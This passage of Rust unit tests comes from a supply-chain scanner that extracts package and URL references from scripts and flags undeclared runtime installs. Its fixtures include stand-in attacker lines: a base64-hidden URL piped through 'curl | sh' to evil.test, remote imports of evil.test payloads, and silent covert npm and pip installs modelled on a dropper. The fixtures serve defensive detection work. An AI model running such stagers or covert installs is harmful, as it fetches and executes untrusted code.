            refs: Vec::new(),
            text: Some(script),
        };
        scan_shell(out.text, "shell", &mut out);
        let purls: Vec<&str> = out
            .refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Purl(p) => Some(p.as_str()),
                RefLocator::Url(_) => None,
            })
            .collect();
        assert!(
            purls.contains(&"pkg:golang/github.com/evil/mod@v1.2.3"),
            "{purls:?}"
        );
        assert!(purls.contains(&"pkg:cargo/badcrate"), "{purls:?}");
        assert!(purls.contains(&"pkg:gem/evilgem"), "{purls:?}");
        assert!(purls.contains(&"pkg:composer/evil/pkg"), "{purls:?}");
        assert!(purls.contains(&"pkg:deb/sneakydeb"), "{purls:?}");
        assert!(purls.contains(&"pkg:deb/nginx@1.18.0"), "{purls:?}");
    }

    #[test]
    fn references_in_bytes_recovers_base64_encoded_url() {
        // A shell stager that base64-decodes a URL and curls it — the URL is
        // never in the clear, only as base64 (`https://evil.test/x.sh`). stng
        // decodes it during extraction; discovery must still surface it.
        let script =
            b"#!/bin/sh\nu=$(echo aHR0cHM6Ly9ldmlsLnRlc3QveC5zaA== | base64 -d)\ncurl -fsSL \"$u\" | sh\n";
        let refs = references_in_bytes(script, "stage.sh");
        let urls: Vec<_> = refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Url(u) => Some(u.as_str()),
                RefLocator::Purl(_) => None,
            })
            .collect();
        assert!(
            urls.contains(&"https://evil.test/x.sh"),
            "decoded base64 url should be recovered; got {refs:?}"
        );
    }

    #[test]
    fn references_in_bytes_finds_dockerfile_url() {
        let df = b"FROM alpine\nRUN curl -fsSL https://example.com/index.html | sh\n";
        let refs = references_in_bytes(df, "Dockerfile");
        let urls: Vec<_> = refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Url(u) => Some(u.as_str()),
                RefLocator::Purl(_) => None,
            })
            .collect();
        assert!(
            urls.contains(&"https://example.com/index.html"),
            "expected the RUN url; got {refs:?}"
        );
    }

    /// Collect the PURL strings from a reference list, for test assertions.
    fn purls_of(refs: &[ExternalRef]) -> Vec<String> {
        refs.iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Purl(p) => Some(p.clone()),
                RefLocator::Url(_) => None,
            })
            .collect()
    }

    #[test]
    fn recognizes_programmatic_npm_install_in_js() {
        // db-xorma's covert dropper: a third-party install API aliased as `npm`
        // installs an undeclared package at runtime with stealth options. The
        // option keys ("no-save", loglevel:"silent") must NOT be read as packages.
        let js = b"const { syncApi: npm } = require(\"oubliette\");\n\
            try { require(\"db-dx-connector\"); } catch (e) {\n\
            npm().install(\"db-dx-connector\", { \"no-save\": true, loglevel: \"silent\" });\n\
            }\n";
        let purls = purls_of(&references_in_bytes(js, "index.js"));
        assert!(
            purls.contains(&"pkg:npm/db-dx-connector".to_string()),
            "covert install package should be hunted; got {purls:?}"
        );
        assert!(
            !purls.iter().any(|p| p.contains("no-save")
                || p.contains("loglevel")
                || p.contains("silent")
                || p == "pkg:npm/true"),
            "option keys/values must not be read as packages; got {purls:?}"
        );
    }

    #[test]
    fn recognizes_python_subprocess_pip_install() {
        let py = b"import subprocess\n\
            subprocess.run([\"pip\", \"install\", \"evil-pkg\", \"--quiet\"])\n";
        let purls = purls_of(&references_in_bytes(py, "setup_helper.py"));
        assert!(
            purls.contains(&"pkg:pypi/evil-pkg".to_string()),
            "list-form pip install should be hunted; got {purls:?}"
        );
    }

    #[test]
    fn recognizes_programmatic_pip_install_in_python() {
        // The Python analog of db-xorma: pip's programmatic API installs an
        // undeclared package at runtime. scan_source flattens the punctuation;
        // `install` is no longer at position 1, so match_pm must scan ahead.
        let py = b"import pip\n\
            pip.main([\"install\", \"evil-pkg\"])\n\
            pip._internal.main([\"install\", \"second-pkg\"])\n";
        let purls = purls_of(&references_in_bytes(py, "bootstrap.py"));
        assert!(
            purls.contains(&"pkg:pypi/evil-pkg".to_string()),
            "pip.main install should be hunted; got {purls:?}"
        );
        assert!(
            purls.contains(&"pkg:pypi/second-pkg".to_string()),
            "pip._internal.main install should be hunted; got {purls:?}"
        );
    }

    #[test]
    fn recognizes_deno_specifiers() {
        let script = "#!/bin/sh\n\
            deno add npm:cowsay@1.5.0\n\
            deno install jsr:@evil/loader\n\
            deno run -A npm:@scope/payload\n\
            deno run https://evil.test/mod.ts\n\
            deno run ./local.ts\n";
        let mut out = Found {
            refs: Vec::new(),
            text: Some(script),
        };
        scan_shell(out.text, "shell", &mut out);
        let purls = purls_of(&out.refs);
        assert!(
            purls.contains(&"pkg:npm/cowsay@1.5.0".to_string()),
            "{purls:?}"
        );
        assert!(
            purls.contains(&"pkg:jsr/%40evil/loader".to_string()),
            "{purls:?}"
        );
        assert!(
            purls.contains(&"pkg:npm/%40scope/payload".to_string()),
            "{purls:?}"
        );
        // A local script is not a registry package; the URL specifier is left to
        // the URL scanner, not emitted as a package.
        assert!(
            !purls
                .iter()
                .any(|p| p.contains("local") || p.contains("evil.test")),
            "local/URL specifiers must not be packages: {purls:?}"
        );
    }

    #[test]
    fn recognizes_conda_installs() {
        let script = "#!/bin/sh\n\
            conda install -y numpy=1.21\n\
            mamba install conda-forge::evilpkg\n";
        let mut out = Found {
            refs: Vec::new(),
            text: Some(script),
        };
        scan_shell(out.text, "shell", &mut out);
        let purls = purls_of(&out.refs);
        assert!(
            purls.contains(&"pkg:conda/numpy@1.21".to_string()),
            "{purls:?}"
        );
        assert!(
            purls.contains(&"pkg:conda/evilpkg".to_string()),
            "{purls:?}"
        );
    }

    #[test]
    fn recognizes_git_clone_and_vcs_specifiers() {
        // git clone (https + ssh shorthand), and a `git+` VCS install specifier.
        let script = "#!/bin/sh\n\
            git clone https://github.com/evil/payload.git /tmp/p\n\
            git clone git@gitlab.com:evil/stage2.git\n\
            pip install git+https://github.com/evil/wheelhouse\n";
        let refs = references_in_bytes(script.as_bytes(), "setup.sh");
        let repos: Vec<&str> = refs
            .iter()
            .filter(|r| r.kind == RefKind::Repository)
            .filter_map(|r| match &r.locator {
                RefLocator::Url(u) => Some(u.as_str()),
                RefLocator::Purl(_) => None,
            })
            .collect();
        // git_refs classifies clone targets (incl. SSH `git@`, which the http-only
        // URL scanner cannot see) as Repository.
        assert!(
            repos.contains(&"https://github.com/evil/payload"),
            "{repos:?}"
        );
        assert!(repos.contains(&"git@gitlab.com:evil/stage2"), "{repos:?}");
        // The `git+https://…` repo is still surfaced (the string-URL scanner
        // claims the bare https form first, so it lands as a UrlFetch).
        let all: Vec<&str> = refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Url(u) => Some(u.as_str()),
                RefLocator::Purl(_) => None,
            })
            .collect();
        assert!(
            all.contains(&"https://github.com/evil/wheelhouse"),
            "git+ specifier repo should be surfaced: {all:?}"
        );
    }

    #[test]
    fn recognizes_oneshot_runners() {
        let script = "#!/bin/sh\n\
            npx -y create-evil-app\n\
            pnpm dlx sketchy-tool\n\
            uvx evilcli\n";
        let mut out = Found {
            refs: Vec::new(),
            text: Some(script),
        };
        scan_shell(out.text, "shell", &mut out);
        let purls = purls_of(&out.refs);
        assert!(
            purls.contains(&"pkg:npm/create-evil-app".to_string()),
            "{purls:?}"
        );
        assert!(
            purls.contains(&"pkg:npm/sketchy-tool".to_string()),
            "{purls:?}"
        );
        assert!(purls.contains(&"pkg:pypi/evilcli".to_string()), "{purls:?}");
    }

    #[test]
    fn recognizes_dynamic_import_of_undeclared_package() {
        // A runtime `import()` of a bare specifier — invisible to static
        // dependency resolution. Builtins and relative chunks are skipped.
        let js = b"async function load(){\n\
            const m = await import(\"stripe-checkout-helper\");\n\
            const r = await import(\"./local-chunk.js\");\n\
            const f = await import(\"node:fs\");\n\
            return m;\n}\n";
        let purls = purls_of(&references_in_bytes(js, "loader.mjs"));
        assert!(
            purls.contains(&"pkg:npm/stripe-checkout-helper".to_string()),
            "dynamic import of bare package should be hunted; got {purls:?}"
        );
        assert!(
            !purls
                .iter()
                .any(|p| p.contains("local-chunk") || p.contains("fs")),
            "relative chunks and builtins must be skipped; got {purls:?}"
        );
    }

    #[test]
    fn recognizes_python_importlib_dynamic_import() {
        let py = b"import importlib\n\
            mod = importlib.import_module(\"evil_telemetry\")\n\
            os_mod = __import__(\"os\")\n\
            sub = importlib.import_module(\"requests.adapters\")\n";
        let purls = purls_of(&references_in_bytes(py, "plugin.py"));
        assert!(
            purls.contains(&"pkg:pypi/evil_telemetry".to_string()),
            "importlib.import_module of bare package should be hunted; got {purls:?}"
        );
        assert!(
            purls.contains(&"pkg:pypi/requests".to_string()),
            "dotted submodule should resolve to its top-level package; got {purls:?}"
        );
        assert!(
            !purls.iter().any(|p| p == "pkg:pypi/os"),
            "stdlib __import__ must be skipped; got {purls:?}"
        );
    }

    #[test]
    fn recognizes_remote_dynamic_import_as_url() {
        let js = b"const evil = await import(\"https://evil.test/payload.mjs\");\n";
        let refs = references_in_bytes(js, "remote.mjs");
        let urls: Vec<_> = refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Url(u) => Some(u.as_str()),
                RefLocator::Purl(_) => None,
            })
            .collect();
        assert!(
            urls.contains(&"https://evil.test/payload.mjs"),
            "remote dynamic import should be a UrlFetch; got {refs:?}"
        );
    }

    #[test]
    fn computed_dynamic_import_yields_no_named_package() {
        // A computed specifier has no statically-known name to hunt or fetch.
        let js = b"const name = process.env.MOD;\nconst m = await import(name);\n";
        let purls = purls_of(&references_in_bytes(js, "computed.mjs"));
        assert!(
            purls.is_empty(),
            "computed import is unnameable; got {purls:?}"
        );
    }

    /// Build a package reference of a given kind from a PURL string.
    fn pkg_ref(kind: RefKind, purl: &str) -> ExternalRef {
        ExternalRef {
            locator: RefLocator::Purl(purl.to_string()),
            kind,
            source: "test".into(),
            evidence: String::new(),
            offset: 0,
            pinned_hash: None,
            content_sha256: None,
        }
    }

    #[test]
    fn import_calls_recovers_loads_from_symbols() {
        // The facts-only path: archive members keep Call symbols after their
        // bytes are discarded, so `require("db-dx-connector")` is still hunted.
        let symbols = vec![
            Symbol::Call {
                target: Some("require".into()),
                args: vec![Arg::String {
                    value: "db-dx-connector".into(),
                }],
                offset: Some(42),
            },
            Symbol::Call {
                target: Some("require".into()),
                args: vec![Arg::String {
                    value: "node:fs".into(),
                }],
                offset: None,
            },
            Symbol::Call {
                target: Some("importlib.import_module".into()),
                args: vec![Arg::String {
                    value: "evil_telemetry".into(),
                }],
                offset: None,
            },
            // Computed callee (`npm().install`) — no static target, skipped.
            Symbol::Call {
                target: None,
                args: vec![Arg::String {
                    value: "ignored".into(),
                }],
                offset: None,
            },
        ];
        let purls = purls_of(&import_calls(&symbols));
        assert!(
            purls.contains(&"pkg:npm/db-dx-connector".to_string()),
            "{purls:?}"
        );
        assert!(
            purls.contains(&"pkg:pypi/evil_telemetry".to_string()),
            "{purls:?}"
        );
        assert!(
            !purls
                .iter()
                .any(|p| p.contains("fs") || p.contains("ignored")),
            "builtins and computed callees must be skipped; got {purls:?}"
        );
    }

    #[test]
    fn undeclared_packages_diffs_hunted_against_declared() {
        // db-xorma's aggregated refs: mobx/oubliette declared; the dropper's
        // runtime install of db-dx-connector is hunted but undeclared.
        let refs = vec![
            pkg_ref(RefKind::Dependency, "pkg:npm/mobx@^6.0.0"),
            pkg_ref(RefKind::Dependency, "pkg:npm/oubliette@^1.0.2"),
            pkg_ref(RefKind::Command, "pkg:npm/mobx"), // declared → not flagged
            pkg_ref(RefKind::Command, "pkg:npm/db-dx-connector"),
        ];
        let undeclared: Vec<_> = undeclared_packages(&refs)
            .iter()
            .filter_map(|r| purl_coordinate(&r.locator))
            .collect();
        assert_eq!(undeclared, ["pkg:npm/db-dx-connector"]);
    }

    #[test]
    fn undeclared_ignores_version_scope_and_urls() {
        let refs = vec![
            pkg_ref(RefKind::Dependency, "pkg:npm/%40scope/pkg"),
            // Same scoped package with a version pin: still declared.
            pkg_ref(RefKind::Command, "pkg:npm/%40scope/pkg@2.0"),
            ExternalRef {
                locator: RefLocator::Url("https://evil.test/x".into()),
                kind: RefKind::UrlFetch,
                source: "test".into(),
                evidence: String::new(),
                offset: 0,
                pinned_hash: None,
                content_sha256: None,
            },
            pkg_ref(RefKind::Command, "pkg:pypi/evil"),
        ];
        let got: Vec<_> = undeclared_packages(&refs)
            .iter()
            .filter_map(|r| purl_coordinate(&r.locator))
            .collect();
        assert_eq!(got, ["pkg:pypi/evil"]);
    }

    #[test]
    fn bare_install_method_call_is_not_a_package() {
        // A DI/plugin `app.install(plugin, opts)` has no package-manager keyword
        // as a leading token, so it must not be mistaken for a runtime install.
        let js = b"app.install(myPlugin, { name: \"thing\" });\n\
            router.install(\"feature\");\n";
        let purls = purls_of(&references_in_bytes(js, "app.js"));
        assert!(
            purls.is_empty(),
            "no package install present; got {purls:?}"
        );
    }

    #[test]
    fn flags_files_and_urls_are_not_packages() {
        let mut out = Found {
            refs: Vec::new(),
            text: Some("pip install -r requirements.txt realpkg https://x.test/y.whl"),
        };
        commands(out.text.unwrap(), "shell", &mut out);
        let purls: Vec<_> = out
            .refs
            .iter()
            .filter_map(|r| match &r.locator {
                RefLocator::Purl(p) => Some(p.as_str()),
                RefLocator::Url(_) => None,
            })
            .collect();
        assert_eq!(purls, ["pkg:pypi/realpkg"]);
    }
}
